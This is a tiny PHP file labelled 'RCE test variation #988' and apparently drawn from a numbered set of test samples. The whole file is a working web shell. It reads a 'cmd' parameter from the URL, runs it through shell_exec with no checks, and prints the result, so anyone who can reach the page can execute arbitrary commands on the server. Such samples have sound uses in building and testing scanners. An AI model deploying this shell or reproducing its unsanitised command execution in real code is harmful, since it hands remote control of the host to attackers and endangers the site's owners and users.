<?php
// RCE test variation #988
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>